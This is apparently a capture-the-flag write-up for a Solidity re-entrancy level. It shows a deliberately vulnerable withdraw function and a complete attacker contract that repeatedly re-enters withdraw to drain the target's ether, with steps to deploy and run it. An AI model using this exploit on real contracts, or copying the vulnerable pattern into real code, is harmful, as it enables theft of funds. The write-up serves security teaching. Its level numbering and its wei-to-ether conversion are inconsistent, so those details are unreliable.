# Level 1 - Re-entrancy

### Objective

The objective of this level is as follows:

1. Steal all the funds from the contract.

### Contract

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Reentrance {

  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}
```

### Solution

In this level, we will perform a re-entrancy attack.

First, we identify the value of funds in the contract:

```
await getBalance(instance)

```

Next, let us implement the following contract in Remix:

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface level_10 {
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
}

contract ReentranceAttack {
    address public owner;
    level_10 targetContract;
    uint targetValue = 1000000000000000;

    constructor(address _targetAddr) public {
        targetContract = level_10(_targetAddr);
        owner = msg.sender;
    }

    function balance() public view returns (uint) {
        return address(this).balance;
    }

    function donateAndWithdraw() public payable {
        require(msg.value >= targetValue);
        targetContract.donate.value(msg.value)(address(this));
        targetContract.withdraw(msg.value);
    }

    function withdrawAll() public returns (bool) {
        require(msg.sender == owner, "my money!!");
        uint totalBalance = address(this).balance;
        (bool sent, ) = msg.sender.call.value(totalBalance)("");
        require(sent, "Failed to send Ether");
        return sent;
    }

    receive() external payable {
        uint targetBalance = address(targetContract).balance;
        if (targetBalance >= targetValue) {
          targetContract.withdraw(targetValue);
        }
    }
}
```

We deploy `ReentranceAttack` with the level 10 contract address.

Next, we call `donateAndWithdraw` with `1000000000000000` wei (`0.01` ether).

Finally, lets check the value of the contract to ensure that it is zero:

```
await getBalance(instance)

```

Done!
